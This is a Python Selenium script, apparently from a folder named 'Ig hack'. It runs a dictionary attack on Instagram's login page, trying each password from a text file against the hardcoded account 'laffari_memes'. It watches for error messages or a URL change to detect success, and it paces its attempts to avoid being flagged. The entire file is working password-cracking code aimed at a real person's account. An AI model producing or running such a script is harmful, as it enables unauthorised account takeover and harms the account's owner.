import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.common.action_chains import ActionChains

# Initialize the WebDriver using the Service object
chrome_driver_path = r'D:\Ig hack\chromedriver-win64\chromedriver.exe'
service = Service(executable_path=chrome_driver_path)
driver = webdriver.Chrome(service=service)

def clear_field_completely(field):
    """Completely clear a field using multiple methods"""
    try:
        # Method 1: Select all and delete
        field.click()
        field.send_keys(Keys.CONTROL + "a")
        field.send_keys(Keys.DELETE)
        
        # Method 2: Clear using selenium method
        field.clear()
        
        # Method 3: Backspace method as fallback
        field_value = field.get_attribute("value")
        if field_value:
            for _ in range(len(field_value)):
                field.send_keys(Keys.BACK_SPACE)
                
        time.sleep(0.5)  # Small delay to ensure clearing is complete
        
    except Exception as e:
        print(f"Error clearing field: {e}")

def wait_for_page_reset():
    """Wait for the login form to be in a clean state"""
    try:
        # Wait for username field to be ready
        WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.NAME, "username"))
        )
        time.sleep(1)  # Additional wait for form to stabilize
        return True
    except TimeoutException:
        print("Error: Login form not ready")
        return False

try:
    # Open Instagram login page
    print("Opening Instagram login page...")
    driver.get("https://www.instagram.com/accounts/login/")
    
    # Wait for the page to load
    if not wait_for_page_reset():
        driver.quit()
        exit()
        
    print("Login page loaded successfully.")
    
except Exception as e:
    print(f"Error loading Instagram: {e}")
    driver.quit()
    exit()

# Read passwords from file
try:
    with open('passwords.txt', 'r') as file:
        passwords = file.read().splitlines()
        
    if not passwords:
        print("Error: 'passwords.txt' is empty.")
        driver.quit()
        exit()
        
    print(f"Loaded {len(passwords)} passwords from file.")
    
except FileNotFoundError:
    print("Error: 'passwords.txt' not found in the same directory as the script.")
    driver.quit()
    exit()

# Main password testing loop
target_username = "laffari_memes"
login_successful = False

for i, password in enumerate(passwords, 1):
    print(f"\n--- Attempt {i}/{len(passwords)} ---")
    print(f"Testing password: {password}")
    
    try:
        # Ensure we're on the login page
        if "login" not in driver.current_url:
            print("Not on login page, navigating back...")
            driver.get("https://www.instagram.com/accounts/login/")
            if not wait_for_page_reset():
                continue
        
        # Find username and password fields
        try:
            username_field = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.NAME, "username"))
            )
            password_field = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.NAME, "password"))
            )
        except TimeoutException:
            print("Error: Could not locate username/password fields")
            driver.refresh()
            wait_for_page_reset()
            continue
        
        # Completely clear both fields
        print("Clearing username field...")
        clear_field_completely(username_field)
        
        print("Clearing password field...")
        clear_field_completely(password_field)
        
        # Verify fields are actually empty
        if username_field.get_attribute("value") or password_field.get_attribute("value"):
            print("Warning: Fields not completely cleared, trying again...")
            clear_field_completely(username_field)
            clear_field_completely(password_field)
        
        # Enter credentials
        print(f"Entering username: {target_username}")
        username_field.send_keys(target_username)
        time.sleep(0.5)
        
        print(f"Entering password: {password}")
        password_field.send_keys(password)
        time.sleep(0.5)
        
        # Submit the form
        print("Submitting login form...")
        password_field.send_keys(Keys.RETURN)
        
        # Wait and check for results
        time.sleep(3)  # Wait for Instagram to process the login
        
        # Check for various error indicators
        login_failed = False
        
        # Method 1: Check for error alert
        try:
            error_element = driver.find_element(By.ID, "slfErrorAlert")
            if error_element.is_displayed():
                print(f"❌ FAILED: {password} - Error alert detected")
                login_failed = True
        except NoSuchElementException:
            pass
        
        # Method 2: Check for error text
        try:
            error_elements = driver.find_elements(By.XPATH, "//*[contains(text(), 'Sorry, your password was incorrect')]")
            if error_elements:
                print(f"❌ FAILED: {password} - Incorrect password message")
                login_failed = True
        except:
            pass
        
        # Method 3: Check URL change
        current_url = driver.current_url
        if "login" not in current_url and not login_failed:
            print(f"✅ SUCCESS! Password found: {password}")
            print(f"Current URL: {current_url}")
            login_successful = True
            break
        elif not login_failed:
            # If no clear error but still on login page, assume failure
            print(f"❌ FAILED: {password} - Still on login page")
            login_failed = True
        
        if login_failed:
            # Wait a bit before next attempt to avoid being flagged
            time.sleep(2)
            
            # Refresh page to ensure clean state
            print("Refreshing page for clean state...")
            driver.refresh()
            if not wait_for_page_reset():
                print("Could not reset page, continuing...")
                continue
    
    except Exception as e:
        print(f"❌ ERROR with password '{password}': {e}")
        try:
            driver.refresh()
            wait_for_page_reset()
        except:
            print("Could not recover from error")
            continue
    
    # Add delay between attempts to be respectful to Instagram's servers
    if i < len(passwords):  # Don't wait after the last attempt
        time.sleep(1)

# Final results
print("\n" + "="*50)
if login_successful:
    print("🎉 LOGIN SUCCESSFUL!")
    print("Password cracking completed successfully.")
else:
    print("❌ All passwords failed.")
    print("No valid password found in the list.")

print("Script finished.")
driver.quit()